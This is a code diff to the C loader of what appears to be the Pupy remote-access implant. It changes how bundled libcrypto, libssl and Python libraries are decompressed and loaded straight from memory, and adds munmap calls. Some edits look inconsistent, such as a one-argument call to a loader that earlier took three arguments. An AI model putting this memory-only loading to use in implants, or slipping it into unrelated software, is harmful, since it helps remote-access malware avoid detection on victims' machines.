@@ -11,6 +11,7 @@
 #include <string.h>
 #include <pthread.h>
 #include <stdint.h>
+#include <sys/mman.h>
 #include "pupy_load.h"
 #include "Python-dynload.h"
 
@@ -35,7 +36,7 @@ extern DL_EXPORT(void) initpupy(void);
 
 #include "lzmaunpack.c"
 
-static inline void xz_dynload(const char *soname, const char *xzbuf, size_t xzsize) {
+static inline void* xz_dynload(const char *soname, const char *xzbuf, size_t xzsize) {
 	void *uncompressed = NULL;
 	size_t uncompressed_size = 0;
 
@@ -54,6 +55,8 @@ static inline void xz_dynload(const char *soname, const char *xzbuf, size_t xzsi
 		dprint("loading %s from memory failed\n", soname);
 		abort();
 	}
+
+	return res;
 }
 
 uint32_t mainThread(int argc, char *argv[], bool so) {
@@ -66,37 +69,19 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	uintptr_t cookie = 0;
 	PyGILState_STATE restore_state;
 
-	if(!Py_IsInitialized) {
-		void *uncompressed = NULL;
-		size_t uncompressed_size = 0;
-
-		uncompressed = lzmaunpack(
-			resources_python27_so_start,
-			resources_python27_so_size,
-			&uncompressed_size
-		);
-
-		if (!uncompressed) {
-			dprint("Python decompression failed\n");
-			return -1;
-		}
-
-		int res = _load_python(
-			"libpython2.7.so",
-			uncompressed,
-			uncompressed_size
-		);
-
-		free(uncompressed);
-
-		if (!res) {
-			dprint("loading libpython2.7.so from memory failed\n");
-			return -1;
-		}
-	}
 
 	xz_dynload("libcrypto.so.1.0.0", resources_libcrypto_so_start, resources_libcrypto_so_size);
 	xz_dynload("libssl.so.1.0.0", resources_libssl_so_start, resources_libssl_so_size);
+
+	if(!Py_IsInitialized) {
+		_load_python(
+			xz_dynload("libpython2.7.so", resources_python27_so_start, resources_python27_so_size)
+		);
+	}
+
+	munmap(resources_libcrypto_so_start, resources_libcrypto_so_size);
+	munmap(resources_libssl_so_start, resources_libssl_so_size);
+	munmap(resources_python27_so_start, resources_python27_so_size);
 
 	dprint("calling PyEval_InitThreads() ...\n");
 	PyEval_InitThreads();
@@ -150,6 +135,8 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 		resources_bootloader_pyc_start,
 		resources_bootloader_pyc_size
 	);
+
+	munmap(resources_bootloader_pyc_start, resources_bootloader_pyc_size);
 
 	if (seq) {
 		Py_ssize_t i, max = PySequence_Length(seq);
